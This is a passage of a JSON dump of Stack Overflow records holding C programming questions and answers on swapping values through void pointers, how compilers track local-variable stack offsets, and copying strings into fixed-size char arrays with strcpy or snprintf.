4 - which clearly isn't expected - only 0th and 4th array elements should have been swapped.</p>\n\n<p>It's possible to hide getting size behind a macro if needed.</p>\n\n<pre><code>#define SWAP(a, b) swap(&amp;(a), &amp;(b), sizeof(a))\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1518639925, "post_id": 48795471, "comment_id": 84593583, "body": "Interesting that your <code>swap()</code> function modifies the <code>size_t sz;</code> member of the <code>struct</code> passed, which of course won&#39;t affect the <i>source</i> of what was passed."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 2, "last_activity_date": 1518639682, "last_edit_date": 1518639682, "creation_date": 1518639342, "answer_id": 48795471, "question_id": 48794397, "link": "https://stackoverflow.com/questions/48794397/how-to-swap-2-numeric-numbers-of-unknown-exact-type-via-two-void-pointer-parame/48795471#48795471", "title": "How to swap 2 numeric numbers of unknown exact type, via two void pointer parameters?", "body": "<blockquote>\n  <p>This works fine but my question is what if my number is bigger (?)<br>\n  Is my solution is OK ?</p>\n</blockquote>\n\n<p>Code will have trouble unless it knows the exact size.  So, no, OP's solution is not OK.<br>\nSomehow <code>void swap()</code> needs to know the size of the data to swap.</p>\n\n<blockquote>\n  <p>i can only use 2 parameters.</p>\n</blockquote>\n\n<p>Code can cheat and put all the data into <strong>1</strong> argument as a <em>compound literal</em>, since C99.</p>\n\n<pre><code>typedef struct {\n  void *a;\n  void *b;\n  size_t sz;\n} swap_T;\n\n// Only 1 parameter!!\nvoid swap(swap_T sw) {\n  unsigned char * q1 = sw.a;\n  unsigned char * q2 = sw.b;\n  while (sw.sz &gt; 0) {\n    sw.sz--;\n    unsigned char p = q1[sw.sz];\n    q1[sw.sz] = q2[sw.sz];\n    q2[sw.sz] = p;\n  }\n}\n\nint main(void) {\n  double a = 100123000000.2;\n  double b = 100065450000.3;\n  printf(\"a: %g, b: %g\\n\", a, b);\n  swap(((swap_T ) { &amp;a, &amp;b, sizeof a } ));  // Compound literal\n  printf(\"a: %g, b: %g\\n\", a, b);\n  return 0;\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>a: 1.00123e+11, b: 1.00065e+11\na: 1.00065e+11, b: 1.00123e+11\n</code></pre>\n\n<p>Code could wrap the <code>swap(((swap_T ) { &amp;a, &amp;b, sizeof a } ))</code> in a macro that looks like a function call of 2</p>\n\n<pre><code>#define SWAP(a,b) (swap(((swap_T ) { &amp;(a), &amp;(b), sizeof (a) } )))\n...\nSWAP(a,b);\n</code></pre>\n\n<p>As long as <code>a</code> is not an expression with a  <em>variable logic array</em> (VLA) and with side-effects, the macro should work fine.</p>\n\n<p>Of course, best if <code>a,b</code> are the same type.</p>\n"}], "owner": {"reputation": 131, "user_id": 9268588, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/25114647b854c5a9f410a84b2963b9ba?s=128&d=identicon&r=PG&f=1", "display_name": "Dean Movy", "link": "https://stackoverflow.com/users/9268588/dean-movy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "accepted_answer_id": 48795471, "answer_count": 2, "score": 1, "last_activity_date": 1536904419, "creation_date": 1518634814, "last_edit_date": 1536904419, "question_id": 48794397, "link": "https://stackoverflow.com/questions/48794397/how-to-swap-2-numeric-numbers-of-unknown-exact-type-via-two-void-pointer-parame", "title": "How to swap 2 numeric numbers of unknown exact type, via two void pointer parameters?", "body": "<p>I need to write a function that replaces 2 \"numeric numbers\", of otherwise unknown type.</p>\n\n<p>I don't know the exact type and I can only use 2 parameters.</p>\n\n<p>So this is what I have tried:</p>\n\n<pre><code>void swap(void *p1, void *p2)\n{\n    char p;\n    char * q1 = (char *)p1;\n    char * q2 = (char *)p2;\n    for (int i = 0; i &lt; sizeof(long double); i++)\n    {\n        p = q1[i];\n        q1[i] = q2[i];\n        q2[i] = p;\n    }\n}\n</code></pre>\n\n<p>Usage:</p>\n\n<pre><code>double a = 100123000000.2;\ndouble b = 100065450000.3;\nprintf(\"a: %1f, b: %1f\\n\", a, b);\nswap(&amp;a, &amp;b)\nprintf(\"a: %1f, b: %1f\\n\", a, b);\n</code></pre>\n\n<p>This works fine but my question is what if my <code>number</code> is bigger then <code>long double</code> (or there is no one..)<br>\nIs my solution OK?</p>\n"}, {"tags": ["c", "assembly", "memory-management", "cpu-architecture"], "comments": [{"owner": {"reputation": 6596, "user_id": 5021321, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/29f10a1b457e63d44e3a221e89e32c17?s=128&d=identicon&r=PG", "display_name": "Eli Sadoff", "link": "https://stackoverflow.com/users/5021321/eli-sadoff"}, "edited": false, "score": 0, "creation_date": 1518634609, "post_id": 48794317, "comment_id": 84590835, "body": "<a href=\"https://cs.stackexchange.com/questions/76871/how-are-variables-stored-in-and-retrieved-from-the-program-stack\">This</a> might be helpful."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518634660, "post_id": 48794317, "comment_id": 84590864, "body": "It&#39;s not the process itself, the compiler determines which variables are to be stored in the stack, and which are not. The compiler may not even use the stack at all."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1518647371, "post_id": 48794317, "comment_id": 84597097, "body": "Tagged <a href=\"https://stackoverflow.com/questions/tagged/assembly\">assembly</a> because ISO C doesn&#39;t require implementations to use a stack to implement automatic storage; using the call-stack for locals is an implementation detail common to all mainstream C implementations on &quot;normal&quot; register-machine CPU architectures, but not part of the C language itself.  (Using a separate data stack would also work easily (C setjmp/longjmp semantics are stack-like), but tie up another register, for the benefit of making return-address overwriting impossible with buffer overflows)"}], "answers": [{"comments": [{"owner": {"reputation": 165, "user_id": 6500611, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/230114182c419aadc93e31e0974d02ab?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Bouwense", "link": "https://stackoverflow.com/users/6500611/christian-bouwense"}, "edited": false, "score": 0, "creation_date": 1518635570, "post_id": 48794437, "comment_id": 84591354, "body": "So for the duration of the function (or local scope in general) where the local variables are being used, <code>SP</code> will be the same, and to the processor <code>a</code> is essentially just <code>SP</code>, <code>b</code> is <code>@(SP+8)</code> and <code>c</code> is <code>@(SP+12)</code>?"}, {"owner": {"reputation": 6567, "user_id": 2435820, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/J6uQT.png?s=128&g=1", "display_name": "kfx", "link": "https://stackoverflow.com/users/2435820/kfx"}, "edited": false, "score": 1, "creation_date": 1518635736, "post_id": 48794437, "comment_id": 84591456, "body": "That is correct. Of course, the exact numerical constants depend on the sizes and alignment requirements of the variables. The example is for a platform where the size of an <code>int</code> is 4 bytes."}, {"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "reply_to_user": {"reputation": 165, "user_id": 6500611, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/230114182c419aadc93e31e0974d02ab?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Bouwense", "link": "https://stackoverflow.com/users/6500611/christian-bouwense"}, "edited": false, "score": 2, "creation_date": 1518635977, "post_id": 48794437, "comment_id": 84591582, "body": "@ChristianBouwense That&#39;s right, SP would change only when you call another function, at which point the current function is &quot;on hold&quot;. Once the other function returns, <code>SP</code> is restored to its value before the call, so the current function can access its local variables at their current offsets again."}, {"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "reply_to_user": {"reputation": 165, "user_id": 6500611, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/230114182c419aadc93e31e0974d02ab?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Bouwense", "link": "https://stackoverflow.com/users/6500611/christian-bouwense"}, "edited": false, "score": 0, "creation_date": 1518636145, "post_id": 48794437, "comment_id": 84591660, "body": "@ChristianBouwense Compiler is allowed to make things a little more complicated by letting variables share the same offset at different times. Let&#39;s say you declare two variables, <code>i</code> and <code>j</code>. Then you use <code>i</code> before the first use of <code>j</code>, and stop. After that you start using <code>j</code>, and never use <code>i</code> again. This is common when <code>i</code> and <code>j</code> are indexes of two back-to-back loops. In situations like that the compiler is allowed to assign <code>i</code> and <code>j</code> the same offset."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 165, "user_id": 6500611, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/230114182c419aadc93e31e0974d02ab?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Bouwense", "link": "https://stackoverflow.com/users/6500611/christian-bouwense"}, "edited": false, "score": 0, "creation_date": 1518648199, "post_id": 48794437, "comment_id": 84597455, "body": "@ChristianBouwense: SP can change (e.g. while pushing args before a function call in a stack-args calling convention), but the compiler is in control of such changes and can always calculate the right offset to put in the machine code.  You could see this on x86, where many of the 32-bit calling conventions don&#39;t pass any args in registers, so all calls to non-void functions push some args (or reserve space ahead of time and simply store to space right above the stack pointer).  See both ways for <code>gcc -O3</code> for 32-bit x86: <a href=\"https://godbolt.org/g/tbxzNY\" rel=\"nofollow noreferrer\">godbolt.org/g/tbxzNY</a>."}], "tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": true, "score": 6, "last_activity_date": 1518634971, "creation_date": 1518634971, "answer_id": 48794437, "question_id": 48794317, "link": "https://stackoverflow.com/questions/48794317/how-does-a-process-keep-track-of-its-local-variables/48794437#48794437", "title": "How does a process keep track of its local variables", "body": "<p>Offsets of local variables are \"baked into\" the machine code as constants. By the time the compiler is done, things that your program referred to as local variables are replaced with fixed memory offsets assigned by compiler.</p>\n\n<p>Let's say you declare three local variables:</p>\n\n<pre><code>char a[8];\nint b;\nshort c;\n</code></pre>\n\n<p>The compiler assigns offsets to these variables: <code>a</code> is at offset <code>0</code>, <code>b</code> is at offset <code>8</code>, and <code>c</code> is at offset <code>12</code>. Let's say your code does <code>b += c</code>. Compiler translates this into a block of code that looks like this:</p>\n\n<pre><code>LOAD    @(SP+8)\nADD     @(SP+12)\nSTORE   @(SP+8)\n</code></pre>\n\n<p>The only value that changes here is <code>SP</code> (stack pointer). All offsets are numeric constants.</p>\n"}, {"comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1518648414, "post_id": 48794568, "comment_id": 84597538, "body": "The question didn&#39;t mention x86.  You should probably say &quot;on x86 for example&quot; in there somewhere before the x86-specific stuff.  Many RISC machines don&#39;t have any convention of using a base pointer.  e.g. MIPS doesn&#39;t have a <code>push</code> instruction, only load/store, and no disadvantage to referencing locals relative to the stack pointer vs. any other register."}], "tags": [], "owner": {"reputation": 23944, "user_id": 1305969, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wlo8z.png?s=128&g=1", "display_name": "zx485", "link": "https://stackoverflow.com/users/1305969/zx485"}, "is_accepted": false, "score": 2, "last_activity_date": 1518705785, "last_edit_date": 1518705785, "creation_date": 1518635493, "answer_id": 48794568, "question_id": 48794317, "link": "https://stackoverflow.com/questions/48794317/how-does-a-process-keep-track-of-its-local-variables/48794568#48794568", "title": "How does a process keep track of its local variables", "body": "<p><em>Preface: The following text uses the x86 architecture as example. Other architectures do handle things differently.</em></p>\n\n<blockquote>\n  <p>[...] it does so by pushing them into memory as a stack, [...]</p>\n</blockquote>\n\n<p>That's close. <em>it does so by pushing them into memory <strong>ON THE</strong> stack [of the current process]</em>. Every <em>process</em> has its own stack. Therefore with every context switch this <em>Stack Frame</em> does change - and so do its <em>local variables (on the stack)</em>.</p>\n\n<p>Usually(!) locally defined variables are referenced relative to the <em>Stack Frame</em> saved and present in the <code>EBP</code> register. This happens in contrast to <em>globally defined</em> varables which are referenced relative to the <em>Data Segment Base</em>. So every process does have its own stack with its own <em>local variables</em>.</p>\n\n<p>Newer compilers can spare the register <code>EBP</code> and reference the variables relative to the  <code>ESP</code> register. This has two consequences:</p>\n\n<ul>\n<li>one register more available to use</li>\n<li>one possibility less for debugging (debugging often used the <code>EBP</code> value as reference for the current <em>Stack Frame</em> to identify local variables). So this makes debugging harder without a separate <em>debugging information file</em>.</li>\n</ul>\n\n<p>So to answer your main question</p>\n\n<blockquote>\n  <p>How does a process keep track of its local variables</p>\n</blockquote>\n\n<p>Processes keep  track of their <em>Stack Frame</em> (which contains the <em>Local Variables</em>), but not of their <em>Local Variables</em> themselves. And the <em>Stack Frame</em> changes with each <em>Process Switch</em>. The <em>Local Variables</em> are merely referenced relative to the <em>Stack Frame Pointer</em> kept in the register <code>EBP</code> (or relative to the <em>Stack Pointer</em> <code>ESP</code>, which depends on the compiler settings).</p>\n"}, {"comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1518664550, "post_id": 48794726, "comment_id": 84601741, "body": "Almost all platforms have stacks that grow down, including x86, so your example should be <code>mov eax, [esp+4]</code>.  Only the System V x86-64 ABI has a red-zone where you can safely put locals <i>below</i> <code>rsp</code> in leaf functions, even in the general case when you have signal handlers installed.  (And in that case, you&#39;d use <code>[rsp-4]</code>.  Although gcc did have missed optimizations when compiling for the x32 ABI (32-bit pointers in long mode) where it would use the address-size prefix even for accessing the stack, so you could actually get some gcc versions to emit <code>mov eax, [esp-4]</code> with the right options)"}], "tags": [], "owner": {"reputation": 368, "user_id": 2904562, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77e6e82a71d9209170823146567abca2?s=128&d=identicon&r=PG&f=1", "display_name": "Michal Butterweck", "link": "https://stackoverflow.com/users/2904562/michal-butterweck"}, "is_accepted": false, "score": 1, "last_activity_date": 1518636230, "creation_date": 1518636230, "answer_id": 48794726, "question_id": 48794317, "link": "https://stackoverflow.com/questions/48794317/how-does-a-process-keep-track-of-its-local-variables/48794726#48794726", "title": "How does a process keep track of its local variables", "body": "<p>Compiler does the job in memorizing the offsets. These offsets are simply hardcoded. Like to load the variable to register (eg. to eax) compiler would produce something like <code>mov eax, [esp-4]</code>, where esp is stack pointer register and 4 is the offset. If new variable will be pushed next mov to get/set variable will have bigger offset. All this is compilation time analysis. </p>\n\n<p>Also, the stack on some platform may be reversed - so offset will be positive. </p>\n"}], "owner": {"reputation": 165, "user_id": 6500611, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/230114182c419aadc93e31e0974d02ab?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Bouwense", "link": "https://stackoverflow.com/users/6500611/christian-bouwense"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1369, "favorite_count": 0, "accepted_answer_id": 48794437, "answer_count": 3, "score": 5, "last_activity_date": 1518705785, "creation_date": 1518634544, "last_edit_date": 1518647231, "question_id": 48794317, "link": "https://stackoverflow.com/questions/48794317/how-does-a-process-keep-track-of-its-local-variables", "title": "How does a process keep track of its local variables", "body": "<p>As far as I know, when a process allocates local variables, it does so by pushing them onto memory as a stack, but still accesses them as random memory by using an offset from the stack pointer to reference them (from this thread <a href=\"https://stackoverflow.com/questions/26898040/what-is-the-idea-behind-using-a-stack-for-local-variables\">What is the idea behind using a stack for local variables?</a>).</p>\n\n<p>However, how does it know which variables have what offset? Am I thinking about this in the right way?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "edited": false, "score": 0, "creation_date": 1518634342, "post_id": 48794245, "comment_id": 84590702, "body": "<code>name</code> is just a pointer - where is the memory where we will store something?"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518634410, "post_id": 48794245, "comment_id": 84590733, "body": "<code>client_fifo_name</code> is an array, you cannot assign a pointer to an array. If you want to copy the contents pointed to by the array (in this case a string), you have to use <code>strncpy</code>."}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 1, "creation_date": 1518634420, "post_id": 48794245, "comment_id": 84590736, "body": "Why not just use <code>prod_args-&gt;client_fifo_name</code> in the <code>sprintf</code>?"}, {"owner": {"reputation": 87, "user_id": 7280601, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10208792121773405/picture?type=large", "display_name": "Pierfrancesco", "link": "https://stackoverflow.com/users/7280601/pierfrancesco"}, "reply_to_user": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1518635991, "post_id": 48794245, "comment_id": 84591586, "body": "@JohnnyMopp you&#39;re right!!"}], "answers": [{"comments": [{"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "reply_to_user": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 0, "creation_date": 1518634817, "post_id": 48794313, "comment_id": 84590956, "body": "@P.P..: You can&#39;t assign to <code>char[]</code> - that&#39;s the idea, I will edit it"}, {"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "reply_to_user": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 0, "creation_date": 1518635032, "post_id": 48794313, "comment_id": 84591064, "body": "@P.P..: Edited."}], "tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 1, "last_activity_date": 1518636047, "last_edit_date": 1518636047, "creation_date": 1518634526, "answer_id": 48794313, "question_id": 48794245, "link": "https://stackoverflow.com/questions/48794245/incompatible-types-when-assigning-to-type-char32-from-type-char/48794313#48794313", "title": "Incompatible types when assigning to type char[32] from type &#39;char*&#39;", "body": "<p>The correct way to use <code>name</code> would be (here you have not allocated any memory to which the <code>char*</code> variable points to)</p>\n\n<ul>\n<li><code>char *name = malloc(MAXLEN+1);</code> Check the return value of <code>malloc</code>.</li>\n</ul>\n\n<p>Or using an array</p>\n\n<ul>\n<li><code>char name[MAXLEN+1];</code></li>\n</ul>\n\n<p>After you did that - you will have to use <code>strcpy</code> to copy the content of the <code>name</code> to the designated array. Arrays are non-modifiable lvalue - assigning something to - it is error.</p>\n\n<p>So after you make sure that destination has enough storage to store the string you are going to copy write</p>\n\n<pre><code>strcpy(prod_args-&gt;client_fifo_name , name);\n</code></pre>\n\n<p>To explain the error - here it finds the type mismatch in the line <code>prod_args-&gt;client_fifo_name = name;</code> here the left hand of assignment has type <code>char []</code> and on the right it is <code>char *</code>. These mismatch of type in the assignment causes the error. </p>\n\n<p>Also I just corrected the possible errors - you can omit allocating extra memory before copying to the actual one. You can directly use <code>s(*)printf</code> with the final target variable as buffer.</p>\n"}, {"tags": [], "owner": {"reputation": 356, "user_id": 4485708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Hwfmt.png?s=128&g=1", "display_name": "Whilom Chime", "link": "https://stackoverflow.com/users/4485708/whilom-chime"}, "is_accepted": false, "score": 2, "last_activity_date": 1518634865, "last_edit_date": 1518634865, "creation_date": 1518634644, "answer_id": 48794344, "question_id": 48794245, "link": "https://stackoverflow.com/questions/48794245/incompatible-types-when-assigning-to-type-char32-from-type-char/48794344#48794344", "title": "Incompatible types when assigning to type char[32] from type &#39;char*&#39;", "body": "<p>The types are incompatible because the left hand of the assignment is to exactly 32 characters, but the right hand of the assignment is a pointer.  I'm guessing, but you probably want:</p>\n\n<pre><code>snprintf(prod_args-&gt;client_fifo_name,\n         FIFO_NAME_MAX_LENGTH,\n         \"%s%d\",\n         CLIENT_FIFO_NAME_SUFFIX, i);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1518637602, "last_edit_date": 1518637602, "creation_date": 1518637168, "answer_id": 48794967, "question_id": 48794245, "link": "https://stackoverflow.com/questions/48794245/incompatible-types-when-assigning-to-type-char32-from-type-char/48794967#48794967", "title": "Incompatible types when assigning to type char[32] from type &#39;char*&#39;", "body": "<blockquote>\n  <p>Incompatible types when assigning to type char[32] from type 'char*'<br>\n  I've a problem assigning thread_args_t->client_fifo_name.</p>\n</blockquote>\n\n<p>As <code>prod_args-&gt;client_fifo_name</code> in an <em>array</em>, it can not be <em>assigned</em> in C.</p>\n\n<p>To assign a chracter array's elements, code may copy data with <code>sprintf(), snprintf(), memcpy(), strcpy()</code> or the like as answered by <a href=\"https://stackoverflow.com/a/48794344/2410359\">@Whilom Chime</a>.</p>\n\n<p>Code could assign each element of the array (a <code>char</code>) one at a time too, but let us avoid that.</p>\n\n<p><code>snprintf()</code> is a good choice, yet robust good also checks to see if data fits.</p>\n\n<pre><code>// sprintf(name, \"%s%d\", CLIENT_FIFO_NAME_SUFFIX, i);\n// prod_args-&gt;client_fifo_name = name;\nint count = snprintf(prod_args-&gt;client_fifo_name, sizeof prod_args-&gt;client_fifo_name,  \n    \"%s%d\", CLIENT_FIFO_NAME_SUFFIX, i);\n\n// Check for success\nif (count &lt; 0 || count &gt;= sizeof prod_args-&gt;client_fifo_name) {\n  fprintf(stderr, \"Not enough room or other error.  Good-bye\\n\");\n  exit(EXIT_FAILURE);\n}\n</code></pre>\n"}], "owner": {"reputation": 87, "user_id": 7280601, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/10208792121773405/picture?type=large", "display_name": "Pierfrancesco", "link": "https://stackoverflow.com/users/7280601/pierfrancesco"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1335, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1518637602, "creation_date": 1518634262, "last_edit_date": 1518634627, "question_id": 48794245, "link": "https://stackoverflow.com/questions/48794245/incompatible-types-when-assigning-to-type-char32-from-type-char", "title": "Incompatible types when assigning to type char[32] from type &#39;char*&#39;", "body": "<p>I'm trying to set the parameters of the structure below:</p>\n\n<pre><code>typedef struct thread_args_s {\n    int idx;\n    int role;\n    int fifo_desc;\n    char client_fifo_name[FIFO_NAME_MAX_LENGTH];\n    char msg[MSG_MAX_LENGTH];\n} thread_args_t;\n</code></pre>\n\n<p>I've a problem assigning <code>thread_args_t-&gt;client_fifo_name</code>.</p>\n\n<p>The client_fifo_name is given by a concatenation of the strings <code>CLIENT_FIFO_NAME_SUFFIX + i</code>, using <code>sprintf()</code>.</p>\n\n<p>In detail:</p>\n\n<pre><code>int i;\nchar* name;\n\nfor(i=0; i&lt;THREAD_COUNT-1; i++){\n    thread_args_t* prod_args = malloc(sizeof(thread_args_t));\n    prod_args-&gt;idx = i;\n    prod_args-&gt;role = PROD_ROLE;\n    prod_args-&gt; fifo_desc = server_fifo;\n    sprintf(name, \"%s%d\", CLIENT_FIFO_NAME_SUFFIX, i);\n    //How to assign the string \"name\" to prod_args-&gt;client_fifo_name?\n    prod_args-&gt;client_fifo_name = name;\n    [...]}\n</code></pre>\n\n<p>Compiling, the error is: </p>\n\n<blockquote>\n  <p>Incompatible types when assigning to type <code>char[32]</code> from type <code>char*</code>. </p>\n</blockquote>\n\n<p>How can I fix it?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "edited": false, "score": 4, "creation_date": 1518633866, "post_id": 48794157, "comment_id": 84590431, "body": "X-Y problem. .."}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518633947, "post_id": 48794157, "comment_id": 84590474, "body": "Why such a large array you require? May be possible on a 64-bit system but you&#39;d need to use <code>malloc</code> or <code>calloc</code>. This question will be of interest to you: <a href=\"https://stackoverflow.com/questions/19367881/how-much-memory-calloc-and-malloc-can-allocate\">How much memory calloc and malloc can allocate</a>"}, {"owner": {"reputation": 801, "user_id": 6831215, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jGqeF.jpg?s=128&g=1", "display_name": "O.Rares", "link": "https://stackoverflow.com/users/6831215/o-rares"}, "edited": false, "score": 0, "creation_date": 1518633990, "post_id": 48794157, "comment_id": 84590493, "body": "Yes,just use the code for a small array as input but with bigger limits..."}, {"owner": {"reputation": 681, "user_id": 5994074, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dzK2Q.jpg?s=128&g=1", "display_name": "GAURANG VYAS", "link": "https://stackoverflow.com/users/5994074/gaurang-vyas"}, "edited": false, "score": 1, "creation_date": 1518634141, "post_id": 48794157, "comment_id": 84590585, "body": "can you show us what you have tried and the problem you  faced."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518634186, "post_id": 48794157, "comment_id": 84590615, "body": "Why would you even want to take it as an input? Usually large arrays of data are read from files."}, {"owner": {"reputation": 1, "user_id": 9361560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/734d9087f3f4c6abb54e8d99ebc0c356?s=128&d=identicon&r=PG&f=1", "display_name": "ShrirangKulkarni", "link": "https://stackoverflow.com/users/9361560/shrirangkulkarni"}, "edited": false, "score": 0, "creation_date": 1518634290, "post_id": 48794157, "comment_id": 